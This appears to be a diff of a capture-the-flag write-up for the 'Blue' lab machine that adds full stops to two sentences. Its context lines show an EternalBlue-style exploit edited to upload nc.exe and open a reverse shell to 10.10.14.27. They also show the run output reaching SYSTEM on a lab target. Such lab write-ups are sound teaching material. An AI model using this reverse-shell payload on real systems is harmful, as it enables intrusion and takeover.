@@ -89,7 +89,7 @@ The exploit needs a couple of edits in order to produce a shell. First of all th
         smb_send_file(smbConn, 'nc.exe', 'C', '/nc.exe')
         service_exec(conn, r'cmd /c c:\nc.exe -nv 10.10.14.27 2121 -e cmd.exe')
 ```
-After running this exploit using the following command our netcat listener should receive a shell if it is listening on the same port
+After running this exploit using the following command our netcat listener should receive a shell if it is listening on the same port.
 ```
 root@79a4e2b0be9a:/blue# python blue.py 10.129.112.225
 Target OS: Windows 7 Professional 7601 Service Pack 1
@@ -113,4 +113,4 @@ whoami
 nt authority\system
 ```
 ## Privilege Escalation
-As we attained root from this exploit and have access to the root flag, there is no need for privilege escalation
+As we attained root from this exploit and have access to the root flag, there is no need for privilege escalation.
